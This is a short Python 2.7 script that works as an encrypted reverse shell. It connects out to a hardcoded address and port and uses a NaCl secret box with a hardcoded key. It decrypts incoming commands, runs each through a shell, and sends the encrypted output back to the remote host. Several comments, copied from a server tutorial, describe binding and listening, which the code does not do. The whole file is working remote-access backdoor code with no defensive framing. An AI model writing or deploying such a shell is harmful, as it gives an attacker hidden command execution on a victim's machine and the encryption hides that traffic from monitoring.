#!/usr/bin/python2.7
import nacl.secret
import nacl.utils

import socket,subprocess
import sys,os


HOST = '192.168.1.11'   # Symbolic name, meaning all available interfaces
PORT = 8887 # Arbitrary non-privileged port

# This must be kept secret, this is the combination to your safe
key = '9SeT2kaxYlRYS675TxzHwB2el4Pa15A3'

# This is your safe, you can use it to encrypt or decrypt messages
box = nacl.secret.SecretBox(key)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Socket created'

#Bind socket to local host and port
try:
    s.connect((HOST, PORT))
except socket.error as msg:
    print 'connect failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()

print 'Socket connect complete'

#Start listening on socket
success = box.encrypt('Hello There!')
s.send(success)
#now keep talking with the client
while 1:
    #wait to accept a connection - blocking call
    #conn, addr = s.accept()
    #print 'Connected with ' + addr[0] + ':' + str(addr[1])

    data = s.recv(1024)
    dataDec =  box.decrypt(data)
    if dataDec == "quit": break

    proc = subprocess.Popen(dataDec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdoutput = proc.stdout.read() + proc.stderr.read()
    stdoutputEnc = box.encrypt(stdoutput)
    s.send(stdoutputEnc)

s.send(box.encrypt('bye now!'))
s.close()
